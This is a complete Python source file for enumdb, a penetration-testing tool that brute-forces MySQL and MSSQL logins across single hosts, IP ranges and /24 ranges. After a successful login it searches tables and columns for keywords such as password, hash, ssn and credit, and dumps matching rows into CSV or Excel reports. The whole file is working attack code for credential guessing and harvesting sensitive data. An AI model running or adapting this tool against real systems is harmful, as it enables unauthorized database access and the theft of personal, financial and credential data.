#!/usr/bin/env python3

# Author: m8r0wn
# License: GPL-3.0

import re
import MySQLdb
import pymssql
import argparse
from time import sleep
from sys import exit, argv
from os import path, remove
from openpyxl import Workbook
from threading import Thread, activeCount

##########################################
# Configurable search fields & blacklists
##########################################
# Key terms in table name to search for (all lowercase)
TABLE_KEY_WORDS = ['user', 'login', 'logon', 'config', 'hr', 'finance', 'account', 'password',
                   'passwd', 'hash', 'ssn', 'credit', 'social', '401k', 'benefits']

# Key terms in column name to search for (all lowercase)
COLUMN_KEY_WORDS = ['login', 'account', 'pass', 'ssn', 'credit', 'social']

# Database backlist, ex. information_schema (all lowercase)
DB_BLACKLIST = []

# Table backlist to skip (all lowercase)
TABLE_BLACKLIST = []

# Limit number of results in database dump
SELECT_LIMIT = 100

##########################################
# Excel Reporting Class
##########################################
class create_xlsx():
    def __init__(self, outfile, host, dbtype):
        self.outfile = outfile
        self.create_workbook()
        self.create_overview(host, dbtype)

    def create_workbook(self):
        self.wb = Workbook()

    def save_workbook(self, filename):
        self.wb.save(filename)

    def create_overview(self, host, dbtype):
        # Create enum overview on sheet1
        self.ws0 = self.wb.active
        self.ws0.title = "Overview"
        self.ws0['A1'] = "Target(s):"
        self.ws0['B1'] = host
        self.ws0['A2'] = "DB Type:"
        self.ws0['B2'] = dbtype
        self.ws0['A4'] = "Database"
        self.ws0['B4'] = "Table"
        self.ws0['C4'] = "Server"
        self.sheet1_row = 5

    def addto_overview(self, db, table, keyword):
        # Add db,table,and keyword to sheet1
        self.ws0.cell(row=self.sheet1_row, column=1, value=str(db))
        self.ws0.cell(row=self.sheet1_row, column=2, value=str(table))
        self.ws0.cell(row=self.sheet1_row, column=3, value=str(keyword))
        self.sheet1_row += 1

    def create_sheet(self, db, table, columns, data, host):
        # Create new sheet for each table and add table data
        ws = self.wb.create_sheet(table[0:15])
        row_count = 1
        col_count = 1
        ws['A1'] = "[+] Table: {}   Database: {}   Server: {}".format(table, db, host)
        row_count += 1
        for col in columns:
            ws.cell(row=row_count, column=col_count, value=str(col))
            col_count += 1
        col_count = 1
        row_count += 1
        for row in data:
            for item in row:
                ws.cell(row=row_count, column=col_count, value=str(item))
                col_count += 1
            col_count = 1
            row_count += 1
        self.save_workbook(self.outfile)

##########################################
# MySQL DB Class
##########################################
class mysql():

    def connect(self, host, port, user, passwd):
        try:
            con = MySQLdb.connect(host=host, port=port, user=user, password=passwd, connect_timeout=3)
            con.query_timeout = 15
            print_success("Connection established {}:{}@{}".format(user,passwd,host))
            return con
        except Exception as e:
            print_failure("Login failed {}:{}@{}".format(user,passwd,host))
            return False

    def db_query(self, con, cmd):
        cur = con.cursor()
        cur.execute(cmd)
        data = cur.fetchall()
        cur.close()
        return data

    def get_databases(self, con):
        databases = []
        for x in self.db_query(con, 'SHOW DATABASES;'):
            databases.append(x[0])
        return databases

    def get_tables(self, con, database):
        tables = []
        self.db_query(con, "USE {}".format(database))
        for x in self.db_query(con, 'SHOW TABLES;'):
            tables.append(x[0])
        return tables

    def get_columns(self, con, database, table):
        # database var not used but kept to support mssql
        columns = []
        for x in self.db_query(con, 'SHOW COLUMNS FROM {}'.format(table)):
            columns.append(x[0])
        return columns

    def get_data(self, con, database, table):
        # database var not used but kept to support mssql
        return self.db_query(con, 'SELECT * FROM {} LIMIT {}'.format(table, SELECT_LIMIT))

##########################################
# MSSQL DB Class
##########################################
class mssql():

    def connect(self, host, port, user, passwd):
        try:
            con = pymssql.connect(server=host, port=port, user=user, password=passwd, login_timeout=3, timeout=15)
            print_success("Connection established {}:{}@{}".format(user,passwd,host))
            return con
        except Exception as e:
            print_failure("Login failed {}:{}@{}".format(user,passwd,host))
            return False

    def db_query(self, con, cmd):
        cur = con.cursor()
        cur.execute(cmd)
        data = cur.fetchall()
        cur.close()
        return data

    def get_databases(self, con):
        databases = []
        for x in self.db_query(con, 'SELECT NAME FROM sys.Databases;'):
            databases.append(x[0])
        return databases

    def get_tables(self, con, database):
        tables = []
        for x in self.db_query(con, 'SELECT NAME FROM {}.sys.tables;'.format(database)):
            tables.append(x[0])
        return tables

    def get_columns(self, con, database, table):
        columns = []
        for x in self.db_query(con, 'USE {};SELECT column_name FROM information_schema.columns WHERE table_name = \'{}\';'.format(database, table)):
            columns.append(x[0])
        return columns

    def get_data(self, con, database, table):
        return self.db_query(con, 'SELECT TOP({}) * FROM {}.dbo.{};'.format(SELECT_LIMIT, database, table))

##########################################
# Class to enumerate and parse database
##########################################
class enum_db:
    def __init__(self):
        # Used to init xlsx report
        self.table_count = 0

    def db_main(self, args, target):
        # Setup output file
        outfile = get_outfile(args.report, target)
        # Create class Object by database type
        class_obj = self.db_obj(args.dbtype)
        # Start brute forcing
        for user in args.users:
            for passwd in args.passwords:
                con = class_obj.connect(target, args.port, user, passwd)
                # Start Enumeration
                if con and not args.brute:
                    self.db_enum(class_obj, args.dbtype, con, outfile, target, args.column_search, args.report, args.verbose)
                # Close connection
                if con: con.close()
        if args.report and path.exists(outfile):
            print_closing("Output file created: {}".format(outfile))

    def db_enum(self, db_class, db_type, con, outfile, host, column_search, report, verbose):
        for database in db_class.get_databases(con):
            if database.lower() in DB_BLACKLIST: return
            for table in db_class.get_tables(con, database):
                if table.lower() in TABLE_BLACKLIST: return
                if column_search:
                    self.db_column_search(con, db_type, db_class, outfile, host, database, table, report, verbose)
                else:
                    self.db_table_search(con, db_type, db_class, outfile, host, database, table, report, verbose)

    def db_obj(self, db_type):
        if db_type == 'mssql':
            return mssql()
        elif db_type == 'mysql':
            return mysql()

    def db_reporter(self, report, outfile, host, db_type, table, database, columns, data):
        if report == 'csv':
            write_csv(outfile, columns, data, database, table, host)
        else:
            # Create xlsx workbook on first found data
            if self.table_count == 0:
                self.xlsx = create_xlsx(outfile, host, db_type)
            self.xlsx.addto_overview(database, table, host)
            self.xlsx.create_sheet(database, table, columns, data, host)
        self.table_count += 1

    def db_table_search(self, con, db_type, db_class, outfile, host, database, table, report, verbose):
        for t in TABLE_KEY_WORDS:
            if t in table.lower():
                # Enum data in database, to check for empty data set
                data = db_class.get_data(con, database, table)
                if data:
                    print_status('Keyword match: {:11} Table: {:42} DB: {:23} SRV: {} ({})'.format(t, table, database, host,db_type))
                    if report:
                        self.db_reporter(report, outfile, host, db_type, table, database, db_class.get_columns(con, database, table), data)
                elif verbose:
                    print_empty('{:26} Table: {:42} DB: {:23} SRV: {} ({})'.format("Empty data set", table, database, host, db_type))
                return

    def db_column_search(self, con, db_type, db_class, outfile, host, database, table, report, verbose):
        columns = db_class.get_columns(con, database, table)
        for col_name in columns:
            for keyword in COLUMN_KEY_WORDS:
                if keyword in col_name.lower():
                    # Enum data in database, to check for empty data set
                    data = db_class.get_data(con, database, table)
                    if data:
                        print_status('Column: {:18} Table: {:42} DB: {:23} SRV: {} ({})'.format(col_name, table, database, host, db_type))
                        if report:
                            self.db_reporter(report, outfile, host, db_type, table, database, db_class.get_columns(con, database, table), data)
                    elif verbose:
                        print_empty('{:26} Table: {:42} DB: {:23} SRV: {} ({})'.format("Empty data set", table, database, host, db_type))
                    return

##########################################
# CSV reporting / output functions
##########################################
def write_csv(outfile, columns, data, database, table, host):
    # After table/ column enumeration, write to csv
    write_file(outfile, "\"[+] Table: {}   Database: {}   Server: {}\"\n".format(table, database, host))
    for col in columns:
        write_file(outfile, "\"{}\",".format(col))
    write_file(outfile, "\n")
    data_count = 0
    while data_count != len(data):
        for y in data[data_count]:
            write_file(outfile, "\"{}\",".format(y))
        data_count += 1
        write_file(outfile, "\n")
    write_file(outfile, "\n\n\n")

def write_file(file, data):
    OpenFile = open(file, 'a')
    OpenFile.write('{}'.format(data))
    OpenFile.close()

def outfile_prep(file):
    # Check if another report exists and overwrite
    if path.exists(file):
        remove(file)
    return file

def get_outfile(report, target):
    # Setup output file, new file for every enumerated target
    if report:
        return outfile_prep("enumdb_{}.{}".format(target, file_ext(report)))
    else:
       return False

def file_ext(report):
    if report == 'csv':
        return "csv"
    else:
        return "xlsx"

##########################################
# Print options
##########################################
def print_success(msg):
    # Green
    print('\033[1;32m[+]\033[1;m ' + msg)

def print_status(msg):
    # Blue
    print('\033[1;34m[*]\033[1;m ' + msg)

def print_failure(msg):
    # Red
    print('\033[1;31m[-]\033[1;m ' + msg)

def print_empty(msg):
    # Yellow
    print('\033[1;33m[-]\033[1;m ' + msg)

def print_closing(msg):
    # White
    print('\033[1;37m[*]\033[1;m ' + msg)

##########################################
# Argparse support / input validation
##########################################
def list_targets(t):
    # Take in user input and returns an array of target hosts
    hosts = []
    ip = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    iprange = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\-\d{1,3}$")
    dns = re.compile("^.+\.[a-z|A-Z]{2,}$")
    cidr = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/24$")
    try:
        # Txt File
        if t.endswith(".txt"):
            if path.exists(t):
                return [ip.strip() for ip in open(t)]
            else:
                raise Exception("001: host file not found")
        # Multiple 127.0.0.1,example.com
        elif "," in t:
            for x in t.split(","):
                hosts.append(x)
                # Range 127.0.0.1-50
        elif iprange.match(t):
            a, b = t.split("-")
            c = a.split(".")
            for x in range(int(c[3]), int(b) + 1):
                hosts.append(c[0] + "." + c[1] + "." + c[2] + "." + str(x))
        # Cidr /24
        elif cidr.match(t):
            a = t.split("/")[0].split(".")
            for x in range(0, 256):
                target = a[0] + "." + a[1] + "." + a[2] + "." + str(x)
                hosts.append(target)
        # Single IP match
        elif ip.match(t):
            hosts.append(t)
        # Dns name
        elif dns.match(t) or "--dns" in argv:
            hosts.append(t)
        # No match
        else:
            raise Exception("002: invalid target provided")
        return hosts
    except Exception as e:
        print("[!] List_Target Error " + str(e))
        exit(1)

def default_port(db):
    # Get default port if not provided in args
    if db == "mysql":
        return 3306
    elif db == "mssql":
        return 1433
    else:
        print_failure('Input Error: Invalid database type detected\n')
        exit(1)

def file_exists(parser, filename):
    # Used with argparse to check if input files exists
    if not path.exists(filename):
        parser.error("Input file not found: {}".format(filename))
    return [x.strip() for x in open(filename)]

##########################################
# Main
##########################################
def main(args):
    try:
        for t in args.target:
            Thread(target=enum_db().db_main, args=(args, t,), daemon=True).start()
            # Do not exceed max threads
            while activeCount() > args.max_threads:
                sleep(0.001)
        # Exit all threads before closing
        while activeCount() > 1:
            sleep(0.001)
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        exit(0)

if __name__ == '__main__':
    version = 2.0
    try:
        args = argparse.ArgumentParser(description="""
                   {0}   (v{1})
    --------------------------------------------------
Brute force MySQL or MSSQL database logins. Once provided with valid
credentials, enumdb will attempt to enumerate tables containing
sensitive information such as: users, passwords, ssn, etc.

Usage:
    python3 enumdb.py -u root -p Password1 -t mysql 10.11.1.30
    python3 enumdb.py -u root -p '' -t mysql -brute 10.0.0.0-50
    python3 enumdb.py -u 'domain\\user1 -P pass.txt -t mssql 192.168.1.7
    
    ** Having trouble with inputs? Use '' around username & password **""".format(argv[0], version), formatter_class=argparse.RawTextHelpFormatter, usage=argparse.SUPPRESS)
        user = args.add_mutually_exclusive_group(required=True)
        user.add_argument('-u', dest='users', type=str, action='append', help='Single username')
        user.add_argument('-U', dest='users', default=False, type=lambda x: file_exists(args, x), help='Users.txt file')

        passwd = args.add_mutually_exclusive_group(required=True)
        passwd.add_argument('-p', dest='passwords', action='append', default=[], help='Single password')
        passwd.add_argument('-P', dest='passwords', default=False, type=lambda x: file_exists(args, x), help='Password.txt file')

        args.add_argument('-threads', dest='max_threads', type=int, default=3, help='Max threads (Default: 3)')
        args.add_argument('-port', dest='port', type=int, default=0, help='Specify non-standard port')
        args.add_argument('-report', dest='report', type=str, default=False, help='Output Report: csv, excel (Default: None)')
        args.add_argument('-t', dest='dbtype', type=str, required=True, help='Database types currently supported: mssql, mysql')
        args.add_argument('-columns', dest="column_search", action='store_true', help="Search for key words in column names (Default: table names)")
        args.add_argument('-v', dest="verbose", action='store_true', help="Show keyword matches that respond with no data")
        args.add_argument('-brute', dest="brute", action='store_true', help='Brute force only, do not enumerate')
        args.add_argument('--dns', dest='dns', action='store_true',help='Force dns name during execution')

        args.add_argument(dest='target', nargs='+', help='Target database server(s)')
        args = args.parse_args()
        # Put target input into an array
        args.target = list_targets(args.target[0])
        # Define default port based on dbtype
        if args.port == 0: args.port = default_port(args.dbtype)
        # Launch Main
        print("\nStarting enumdb v.{}\n".format(version) + "-" * 25)
        main(args)
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        exit(0)